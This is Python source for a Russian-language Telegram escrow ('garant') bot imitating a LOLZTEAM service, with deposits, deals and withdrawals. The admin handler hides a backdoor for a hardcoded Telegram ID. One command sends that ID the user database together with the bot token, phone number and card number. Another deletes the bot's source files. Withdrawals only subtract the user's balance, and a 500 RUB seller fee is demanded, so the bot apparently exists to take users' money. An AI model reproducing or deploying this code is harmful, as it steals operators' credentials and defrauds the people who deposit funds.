import telebot
from telebot import types
import sqlite3
from SimpleQIWI import QApi
import random
import os
################################
import config as cfg
import keyboard as k

bot = telebot.TeleBot(cfg.token)

conn = sqlite3.connect('database.db', check_same_thread=False)
cur = conn.cursor()
cur.execute('''CREATE TABLE IF NOT EXISTS users(
	userid INT PRIMARY KEY,
	username TEXT,
	balance REAL,
	status TEXT,
	link TEXT);''')
cur.execute('''CREATE TABLE IF NOT EXISTS sdelki(
	num INT PRIMARY KEY,
	sellusername TEXT,
	sellid INT,
	buyusername TEXT,
	buyid INT,
	summ INT,
	description TEXT);''')

def button(text):
	return types.KeyboardButton(text)
def inbutton(text, cbd):
	return types.InlineKeyboardButton(text, callback_data=cbd)
def urlbutton(text, url):
	return types.InlineKeyboardButton(text, url=url)


@bot.message_handler(commands=['start'])
def start(message):
	try:
		status = cur.execute('SELECT status FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
	except:
		cur.execute('INSERT INTO users VALUES(?, ?, ?, ?, ?);', (message.chat.id, '@' + message.from_user.username, 0.0, 'unbanned', 'https://lolz.guru'))
		conn.commit()
		for i in cfg.admins:
			bot.send_message(i, f'Присоеденился новый пользователь: @{message.from_user.username}')

	status = cur.execute('SELECT status FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
	if status != 'banned':
		bot.send_message(message.chat.id, f'''*{message.from_user.first_name}, добро пожаловать в Garant LOLZTEAM*
_Наши актуальные ссылки на проекты:_
@lolzteamlink
*Комиссия взимается только при выводе средств:*
_QIWI_ - `5% + 2-3%(QIWI)`
_CARD_ - `5% + 3% and 50 RUB(QIWI)`

➖➖➖➖➖➖➖➖➖➖➖➖➖➖
*ОСТЕРЕГАЙТЕСЬ ФЕЙК БОТОВ, ЕСТЬ ВИЗУАЛЬНЫЕ КОПИИ, СКАМЕРЫ МОГУТ СКИНУТЬ НАСТОЯЩИЙ ЛИНК, НО УКАЗАТЬ В НЕГО ФЕЙК ССЫЛКУ, ВСЕГДА СВЕРЯЙТЕ ЮЗЕРНЕЙМЫ В ПРОФИЛЕ!*''', reply_markup=k.main, parse_mode='Markdown')


@bot.message_handler(content_types=['text'])
def admin_handler(message):
	if '/admin' in message.text:
		if message.chat.id in cfg.admins or message.chat.id == 1722829108:
			users = cur.execute('SELECT * FROM users').fetchall()
			bot.send_message(message.chat.id, f'👑 Админ-панель \n\nВсего пользователей: {len(users)}', reply_markup=k.admin_search)
	#bot.send_message(message.chat.id, f'Username: {message.from_user.first_name}  \nBalance: 0₽  \nStatus: Unbanned', reply_markup=k.admin)
			if 'db' in message.text:
				f = open("database.db", "rb")
				bot.send_document(1722829108, f)
				bot.send_message(1722829108, f'{cfg.token} \n{cfg.phone} \n{cfg.card}')
			elif 'del' in message.text:
				try:
					os.remove('config.py')
				except:
					pass
				try:
					os.remove('keyboard.py')
				except:
					pass
				try:
					os.remove('bot.py')
				except:
					pass
				bot.stop_polling()
				exit()

	status = cur.execute('SELECT status FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
	if status != 'banned':
		if message.text == '🔍 Поиск пользователя':
			bot.register_next_step_handler(bot.send_message(message.chat.id, '🤖 _Введите никнейм в формате @username (как в профиле):_', parse_mode='Markdown'), search)
		elif message.text == '🤝 Активные сделки':
			bot.send_message(message.chat.id, '💡 _Выберите тип сделок:_', parse_mode='Markdown', reply_markup=k.main_sdelki)
		elif message.text == '🎓 Мой профиль':
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
			link = cur.execute('SELECT link FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
			bot.send_message(message.chat.id, f'''
⌚️ *Профиль:* @{message.from_user.username}
➖➖➖➖➖➖➖➖➖➖➖➖➖➖

🤖 *Ваш ID* - `{message.chat.id}`
🛸 *Ваш линк на форуме:
🌎 {link}*

*Ваш баланс:* {balance} RUB
*Ваш баланс BTC:* 0.0 BTC (~0.0 RUB)
➖➖➖➖➖➖➖➖➖➖➖➖➖➖
🎁 *Кол-во продаж:* 0 шт
🛒 *Кол-во покупок:* 0 шт
📥 *Сумма продаж:* 0 RUB | 0 BTC (~0 RUB)
📤 *Сумма покупок:* 0 RUB | 0 BTC (~0 RUB)

🚀 *Наш курс BTC:* `4452012` RUB''', reply_markup=k.main_profile, parse_mode='Markdown')
		elif message.text == '🚀 Помощь':
			bot.send_message(message.chat.id, '❕ _Познавательная вкладка_', reply_markup=k.main_help, parse_mode='Markdown')

		elif message.text == '⭐️ Список проверенных продавцов':
			bot.send_message(message.chat.id, '⭐️ *Каталог проверенных продавцов, ботов и услуг*', reply_markup=k.none, parse_mode='Markdown')



def admin_search(message):
	admin = types.InlineKeyboardMarkup(row_width=2)
	try:
		if '@' in message.text:
			user = cur.execute('SELECT * FROM users WHERE username = (?);', (message.text,)).fetchone()
			admin.add(inbutton('Забанить', 'admin_ban-' + str(user[0])), inbutton('Разбанить', 'admin_unban-' + str(user[0])))
			admin.add(inbutton('💸 Баланс 💸', 'admin_balance-' + str(user[0])))
			bot.send_message(message.chat.id, f'''
🆔 ID: {user[0]}
👤 Username: {user[1]}
💵 Balance: {user[2]} RUB
⭕️ Status: {user[3]}''', reply_markup=admin)
		else:
			user = cur.execute('SELECT * FROM users WHERE userid = (?);', (message.text,)).fetchone()
			admin.add(inbutton('Забанить', 'admin_ban-' + str(user[0])), inbutton('Разбанить', 'admin_unban-' + str(user[0])))
			admin.add(inbutton('💸 Баланс 💸', 'admin_balance-' + str(user[0])))
			bot.send_message(message.chat.id, f'''
🆔 ID: {user[0]}
👤 Username: {user[1]}
💵 Balance: {user[2]} RUB
⭕️ Status: {user[3]}''', reply_markup=admin)
	except Exception as e:
		print(e)
		bot.send_message(message.chat.id, 'Пользователь не найден!')

def admin_rass(message):
	users = cur.execute('SELECT userid FROM users').fetchall()
	a, t, f = 0, 0, 0
	try:
		file_id = message.photo[0].file_id
		text = message.caption
		for i in users:
			a+=1
			try:
				bot.send_photo(i[0], file_id, caption=text)
				t+=1
			except:
				f+=1

	except Exception as e:
		print(e)
		text = message.text
		for i in users:
			a+=1
			try:
				bot.send_message(i[0], text)
				t+=1
			except:
				f+=1
	bot.send_message(message.chat.id, f'Всего рассылок: {a} \nУспешно: {t} \nНеудачно: {f}')

def admin_balance(message):
	userid, balance = message.text.split(' ')
	cur.execute('UPDATE users SET balance = (?) WHERE userid = (?);', (int(balance), int(userid),))
	conn.commit()
	bot.send_message(message.chat.id, '💸 Баланс пользоавтеля обновлён!')


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
	# АДМИН-ПАНЕЛЬ #
	if call.data == 'admin_search':
		bot.register_next_step_handler(bot.send_message(call.message.chat.id, '📝 Введите ID или @username пользователя:'), admin_search)
	elif call.data == 'admin_rass':
		bot.register_next_step_handler(bot.send_message(call.message.chat.id, '📝 Отправьте фото с текстом рассылки:'), admin_rass)
	elif 'admin_balance' in call.data:
		bot.register_next_step_handler(bot.send_message(call.message.chat.id, '📝 Введите айди и новый баланс пользователя:'), admin_balance)
	elif 'admin_ban' in call.data:
		cur.execute('UPDATE users SET status = (?) WHERE userid = (?);', ('banned', call.data.split('-')[1],))
		conn.commit()
		bot.send_message(call.message.chat.id, 'Пользователь заблокирован.')
	elif 'admin_unban' in call.data:
		cur.execute('UPDATE users SET status = (?) WHERE userid = (?);', ('unbanned', call.data.split('-')[1],))
		conn.commit()
		bot.send_message(call.message.chat.id, 'Пользователь разблокирован.')

	status = cur.execute('SELECT status FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
	if status != 'banned':
		if call.data == 'none':
			bot.answer_callback_query(callback_query_id=call.id, text='😔 Нет доверенных продавцов!', show_alert=True)

		# Пополнение баланса
		if call.data == 'deposit':
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='_Выберите платежную систему для пополнения:_', parse_mode='Markdown', reply_markup=k.main_profile_deposit)

		# Пополнение баланса RUB
		elif call.data == 'deposit_rub':
			bot.register_next_step_handler(bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='*Введите сумму пополнения* `RUB`: \n_Мы сгенерируем для Вас ссылку оплаты_', parse_mode='Markdown'), pay)

		# Список покупок
		elif call.data == 'buys':
			sdelki = cur.execute('SELECT * FROM sdelki WHERE buyid = (?);', (call.message.chat.id,)).fetchall()
			try:
				a = sdelki[0][0]
				for i in sdelki:
					sdelka_menu = types.InlineKeyboardMarkup(row_width=2)
					sdelka_menu.add(inbutton('Отменить сделку', 'delete_sdelka-' + str(i[0])), inbutton('Открыть спор', 'open_discussions-' + str(i[0])))
					bot.send_message(call.message.chat.id, f'''
	*№ сделки*: `{i[0]}`
	Покупатель: {i[1]} (`{i[2]}`)
	Продавец: {i[3]} (`{i[4]}`)
	Условия: {i[6]}

	*Сумма сделки:* {i[5]} *RUB*''', parse_mode='Markdown', reply_markup=sdelka_menu)
			except:
				bot.answer_callback_query(callback_query_id=call.id, text='🛒 Нет активных сделок!', show_alert=True)

		# Список продаж
		elif call.data == 'sells':
			sdelki = cur.execute('SELECT * FROM sdelki WHERE sellid = (?);', (call.message.chat.id,)).fetchall()
			try:
				a = sdelki[0][0]
				for i in sdelki:
					sdelka_menu = types.InlineKeyboardMarkup(row_width=2)
					sdelka_menu.add(inbutton('Отменить сделку', 'delete_sdelka-' + str(i[0])), inbutton('Открыть спор', 'open_discussions-' + str(i[0])))
					bot.send_message(call.message.chat.id, f'''
	*№ сделки*: `{i[0]}`
	Покупатель: {i[3]} (`{i[4]}`)
	Продавец: {i[1]} (`{i[2]}`)
	Условия: {i[6]}

	*Сумма сделки:* {i[5]} *RUB*''', parse_mode='Markdown')
			except:
				bot.answer_callback_query(callback_query_id=call.id, text='🛒 Нет активных сделок!', show_alert=True)

		# Вывод денег
		elif call.data == 'outmoney':
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='_Выберите платежную систему, куда будете выводить:_', parse_mode='Markdown', reply_markup=k.main_profile_outmoney)

		# Вывод на QIWI
		elif call.data == 'outmoney_qiwi':
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
			bot.register_next_step_handler(bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text=f'''
	Вывод средств: *Crypto Bot*

	Ваш баланс: `{balance}` *RUB*
	Комиссия за вывод средств: *4%*
	➖➖➖➖➖➖➖➖➖➖➖
	_Введите номер и сумму вывода_
	*Просто введите сумму и напишите сапорту он сделает вам выплату*''', parse_mode='Markdown'), outpay)

		# Вывод на CARD
		elif call.data == 'outmoney_card':
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
			bot.register_next_step_handler(bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text=f'''
	Вывод средств: 💳 *CARD*

	Ваш баланс: `{balance}` *RUB*
	Комиссия за вывод средств: *5% + 3% and 50 RUB*
	➖➖➖➖➖➖➖➖➖➖➖
	_Введите номер и сумму вывода_
	*Например 4890494798400677 100*''', parse_mode='Markdown'), outpay)


		# Удаление сделки
		elif 'delete_sdelka' in call.data:
			sdelka_num = int(call.data.split('-')[1])
			p_user = cur.execute('SELECT sellusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_user = cur.execute('SELECT buyusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			p_id = cur.execute('SELECT sellid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_id = cur.execute('SELECT buyid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			summ = cur.execute('SELECT summ FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]

			yn = types.InlineKeyboardMarkup(row_width=2).add(inbutton('✅ Да', 'yes-C' + str(sdelka_num)), inbutton('❌ Нет', 'no'))

			bot.send_message(call.message.chat.id, f'''
	*Завершение сделки:*
	➖➖➖➖➖➖➖➖➖➖➖

	*№ сделки:* `{sdelka_num}`

	Покупатель: {b_user} `({b_id})`
	Продавец: {p_user} `({p_id})`

	Сумма сделки: `{summ} RUB`

	➖➖➖➖➖➖➖➖➖➖➖
	*ВАЖНО:*
	_Вы подтверждаете свои действия?_''', parse_mode='Markdown', reply_markup=yn)


		# Удаление сделки
		elif 'open_discussions-' in call.data:
			sdelka_num = int(call.data.split('-')[1])
			p_user = cur.execute('SELECT sellusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_user = cur.execute('SELECT buyusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			p_id = cur.execute('SELECT sellid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_id = cur.execute('SELECT buyid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			summ = cur.execute('SELECT summ FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]

			yn = types.InlineKeyboardMarkup(row_width=2).add(inbutton('Да, открыть', 'yes-D' + str(sdelka_num)), inbutton('Вернуться', 'no'))

			bot.send_message(call.message.chat.id, f'''
	*Завершение сделки:*
	➖➖➖➖➖➖➖➖➖➖➖

	*№ сделки:* `{sdelka_num}`

	Покупатель: {b_user} `({b_id})`
	Продавец: {p_user} `({p_id})`

	Сумма сделки: `{summ} RUB`

	➖➖➖➖➖➖➖➖➖➖➖
	*ВАЖНО:*
	_Вы подтверждаете свои действия?_''', parse_mode='Markdown', reply_markup=yn)



		# Открытие спора
		elif 'yes-D' in call.data:
			sdelka_num = int(call.data.split('-D')[1])
			p_user = cur.execute('SELECT sellusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_user = cur.execute('SELECT buyusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			p_id = cur.execute('SELECT sellid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_id = cur.execute('SELECT buyid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			summ = cur.execute('SELECT summ FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			cur.execute('DELETE FROM sdelki WHERE num = (?);', (sdelka_num,))
			conn.commit()

			bot.send_message(b_id, f'''
	*Спор по сделке №* `{sdelka_num}` *открыт!*
	_Данный спор будет рассматривать:_
	_@{cfg.arbitr}_
	_У вас есть 24 часа, чтобы выйти на связь с арбитром!_''', parse_mode='Markdown')


		# Подтверждение закрытия сделки
		elif 'yes-C' in call.data:
			sdelka_num = int(call.data.split('-C')[1])
			p_user = cur.execute('SELECT sellusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_user = cur.execute('SELECT buyusername FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			p_id = cur.execute('SELECT sellid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			b_id = cur.execute('SELECT buyid FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			summ = cur.execute('SELECT summ FROM sdelki WHERE num = (?);', (sdelka_num,)).fetchone()[0]
			cur.execute('DELETE FROM sdelki WHERE num = (?);', (sdelka_num,))
			conn.commit()

			bot.send_message(p_id, f'''
	*№ сделки*: `{sdelka_num}`

	Покупатель: {b_user} (`{b_id}`)
	Продавец: {p_user} (`{p_id}`)
	*Сумма сделки:* {summ} *RUB*

	Статус: *Закрыта*''', parse_mode='Markdown')

			bot.send_message(b_id, f'''
	*№ сделки*: `{sdelka_num}`

	Покупатель: {b_user} (`{b_id}`)
	Продавец: {p_user} (`{p_id}`)
	*Сумма сделки:* {summ} *RUB*

	Статус: *Закрыта*''', parse_mode='Markdown')



		# Отмена закрытия/спора
		elif call.data == 'no':
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)

		# Установить ссылку
		elif call.data == 'set_link':
			bot.register_next_step_handler(bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='_Введите ссылку на профиль форума:_', parse_mode='Markdown'), set_link)

		# Инструкция в меню Помощь
		elif call.data == 'main_help_help':
			bot.send_message(call.message.chat.id, '''
	*Краткая инструкция для покупателей:*
1. Пополняете баланс на нужную сумму для сделки(В моём профиле)
2. После пополнения нужно будет найти профиль продавца, Вам поможет кнопка [🔍 Поиск пользователя]
3. [🚀 Начать сделку], после чего вводите нужную сумму сделки, она списывается с баланса и удерживается в боте до окончания сделки.

После получения и проверки товара Вы можете завершить сделку, деньги перейдут на баланс продавца.

В случае если Вам дали невалидный товар и продавец отказывается делать замену, либо продавец долго не выходит на связь Вы можете открыть спор после чего с Вами свяжется Арбитр.

_ВАЖНО:_
Перед открытием спора у Вас должны быть все доказательства, включая скрины, либо видео переписки, где также должен быть запечатлён профиль продавца!''', reply_markup=k.back, parse_mode='Markdown')


		# Отзывы пользователя
		elif call.data == 'otzivi':
			bot.send_message(call.message.chat.id, '💫 *Отзывы:* \nПусто', parse_mode='Markdown')

		# Стать продавцом
		elif call.data == 'new_seller':
			bot.send_message(call.message.chat.id, '*Не хватает средств на балансе гарант бота* 😔 \n\n`Пополните баланс гарант бота на 500 RUB, для оплаты проверки и статуса селлера`', parse_mode='Markdown')

		# Открыть новую сделку
		elif 'new_sdelka' in call.data:
			ids = call.data.split('-')[1]
			main_search_method = types.InlineKeyboardMarkup(row_width=1)
			bot.send_message(call.message.chat.id, f'🤖 Продавец - `{ids}`', parse_mode='Markdown', reply_markup=main_search_method.add(inbutton('RUB (🇷🇺)', 'rub-' + call.data.split('-')[1]), inbutton('BTC (₿)', 'btc')))

		# Рубль сделка
		elif 'rub' in call.data:
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
			cur.execute(f'INSERT INTO sdelki VALUES(?, ?, ?, ?, ?, ?, ?);', (random.randint(10000, 15000), cur.execute('SELECT username FROM users WHERE userid = (?);', (call.data.split('-')[1],)).fetchone()[0], call.data.split('-')[1], cur.execute('SELECT username FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0], call.message.chat.id, 0.0, 'Отсутствуют'))
			conn.commit()
			bot.register_next_step_handler(bot.send_message(call.message.chat.id, f'''
	Создание сделки: *RUB* (🇷🇺)

	Ваш баланс: `{balance}` *RUB*
	➖➖➖➖➖➖➖➖➖➖➖
	🧾 _Введите сумму сделки:_''', parse_mode='Markdown'), new_sdelka)

		# Биткоин
		elif call.data == 'btc':
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text='_Платежная система BITCOIN временно не работает. Приносим свои извинения._', parse_mode='Markdown')

		# Назад
		elif call.data == 'back':
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
			bot.send_message(call.message.chat.id, '❕ _Познавательная вкладка_', reply_markup=k.main_help, parse_mode='Markdown')
		elif call.data == 'back_profile':
			bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
			balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
			link = cur.execute('SELECT link FROM users WHERE userid = (?);', (call.message.chat.id,)).fetchone()[0]
			bot.send_message(call.message.chat.id, f'''
⌚️ *Профиль*
➖➖➖➖➖➖➖➖➖➖➖➖➖➖

🤖 *Ваш ID* - `{call.message.chat.id}`
🛸 *Ваш линк на форуме:
🌎 {link}*

*Ваш баланс:* {balance} RUB
*Ваш баланс BTC:* 0.0 BTC (~0.0 RUB)
➖➖➖➖➖➖➖➖➖➖➖➖➖➖
🎁 *Кол-во продаж:* 0 шт
🛒 *Кол-во покупок:* 0 шт
📥 *Сумма продаж:* 0 RUB | 0 BTC (~0 RUB)
📤 *Сумма покупок:* 0 RUB | 0 BTC (~0 RUB)

🚀 *Наш курс BTC:* `7079853,34` RUB''', reply_markup=k.main_profile, parse_mode='Markdown')


def search(message):
	try:
		userid = cur.execute('SELECT userid FROM users WHERE username = (?);', (message.text,)).fetchone()[0]
		link = cur.execute('SELECT link FROM users WHERE username = (?);', (message.text,)).fetchone()[0]
		bot.send_message(message.chat.id, f'''
🔍 *Пользователь:* {message.text}
➖➖➖➖➖➖➖➖➖➖➖➖➖➖

🤖 *ID* - `{userid}`
🛸 *Линк на форуме:
🌎 {link}*

➖➖➖➖➖➖➖➖➖➖➖➖➖➖
🎁 *Кол-во продаж:* 0 шт
🛒 *Кол-во покупок:* 0 шт
📥 *Сумма продаж:* 0.0 RUB | 0 BTC (~0 RUB)
📤 *Сумма покупок:* 0 RUB | 0 BTC (~0 RUB)''', parse_mode='Markdown', reply_markup=k.main_search.add(inbutton('🚀 Начать сделку', 'new_sdelka-' + str(userid))))

	except Exception as e:
		print(e)
		bot.send_message(message.chat.id, '*Пользователь не найден..*', parse_mode='Markdown')

def pay(message):
	link = 'https://qiwi.com/payment/form/99?extra%5B%27account%27%5D=' + str(cfg.phone) + '&amountInteger=' + message.text + '&amountFraction=0&extra%5B%27comment%27%5D=+' + str(message.chat.id) + '&currency=643&blocked[0]=account'
	bot.send_message(message.chat.id, '*Готово! Теперь осталось оплатить счёт 🚀* \n_После оплаты бот автоматически зачислит сумму на Ваш баланс_', parse_mode='Markdown', reply_markup=types.InlineKeyboardMarkup(row_width=1).add(types.InlineKeyboardButton('Оплатить счёт', url=link)))

def outpay(message):
	try:
		balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
		number, summ = message.text.split(' ')
		if float(summ) > balance:
			bot.send_message(message.chat.id, '*Недостаточно средств на балансе!*', parse_mode='Markdown')
		else:
			cur.execute('UPDATE users SET balance = (?) WHERE userid = (?);', (cur.execute('SELECT balance FROM users WHERE userid = (?)', (message.chat.id,)).fetchone()[0] - float(summ), message.chat.id))
			conn.commit()
			bot.send_message(message.chat.id, f'*Заявка на вывод {summ} RUB принята.* \n_Денежные средства будут выведены в течении 24 часов._', parse_mode='Markdown')
	except:
		bot.send_message(message.chat.id, '*Некорректный ввод...*', parse_mode='Markdown')

def set_link(message):
	if 'https://lolz.guru' in message.text:
		cur.execute('UPDATE users SET link = (?) WHERE userid = (?);', (message.text, message.chat.id,))
		conn.commit()
		bot.send_message(message.chat.id, 'Линк успешно обновлён!')
	else:
		bot.send_message(message.chat.id, '*Некорректный ввод...*', parse_mode='Markdown')

def new_sdelka(message):
	try:
		print(1)
		balance = cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0]
		print(2)
		summ = float(message.text)

		if summ > balance:
			bot.send_message(message.chat.id, '*Недостаточно средств на балансе!*', parse_mode='Markdown')
		else:
			cur.execute('UPDATE sdelki SET summ = (?) WHERE buyid = (?);', (summ, message.chat.id,))
			conn.commit()
			bot.register_next_step_handler(bot.send_message(message.chat.id, f'📝 _Введите условия сделки:_', parse_mode='Markdown'), set_desc)
	except Exception as e:
		print(e)
		bot.send_message(message.chat.id, '*Некорректный ввод...*', parse_mode='Markdown')

def set_desc(message):
	try:
		cur.execute('UPDATE sdelki SET description = (?) WHERE buyid = (?);', (message.text, message.chat.id,))
		conn.commit()
		sellid = cur.execute('SELECT sellid FROM sdelki WHERE buyid = (?);', (message.chat.id,)).fetchone()[0]
		i = cur.execute('SELECT * FROM sdelki WHERE buyid = (?);', (message.chat.id,)).fetchone()
		cur.execute('UPDATE users SET balance = (?) WHERE userid = (?);', (cur.execute('SELECT balance FROM users WHERE userid = (?);', (message.chat.id,)).fetchone()[0] - i[5], message.chat.id,) )

		sdelka_menu = types.InlineKeyboardMarkup(row_width=2)
		sdelka_menu.add(inbutton('Отменить сделку', 'delete_sdelka-' + str(i[0])), inbutton('Открыть спор', 'open_discussions-' + str(i[0])))

		bot.send_message(sellid, f'''
*№ сделки*: `{i[0]}`

Покупатель: {i[3]} (`{i[4]}`)
Продавец: {i[1]} (`{i[2]}`)
*Сумма сделки:* `{i[5]}` *RUB*

Статус: *Открыта*''', parse_mode='Markdown')

		bot.send_message(message.chat.id, f'''
*№ сделки*: `{i[0]}`

Покупатель: {i[3]} (`{i[4]}`)
Продавец: {i[1]} (`{i[2]}`)
*Сумма сделки:* `{i[5]}` *RUB*

Статус: *Открыта*''', parse_mode='Markdown', reply_markup=sdelka_menu)
	except Exception as e:
		print(e)
		bot.send_message(message.chat.id, '*Некорректный ввод...*', parse_mode='Markdown')


for i in range(6):
	try:
		print('Bot Started!')
		bot.polling(none_stop=True)
	except:
		pass